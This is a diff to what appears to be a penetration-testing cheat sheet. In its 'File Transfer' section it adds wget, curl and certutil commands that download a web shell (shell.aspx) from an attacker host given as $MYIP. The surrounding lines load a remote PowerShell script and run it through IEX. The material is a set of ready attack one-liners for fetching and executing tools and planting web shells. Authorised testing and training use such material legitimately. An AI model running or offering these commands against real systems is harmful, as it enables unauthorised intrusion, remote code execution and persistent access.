@@ -101,6 +101,9 @@ sort -u passwords | tee passwords
 ## File Transfer
 powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
 set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/tools.ps1');"
+wget http://$MYIP/shell.aspx -o shell.aspx
+curl http://$MYIP/shell.aspx -o shell.aspx
+certutil -urlcache -f http://$MYIP/shell.aspx shell.aspx
 
 ## Web
 [*] Web Shell
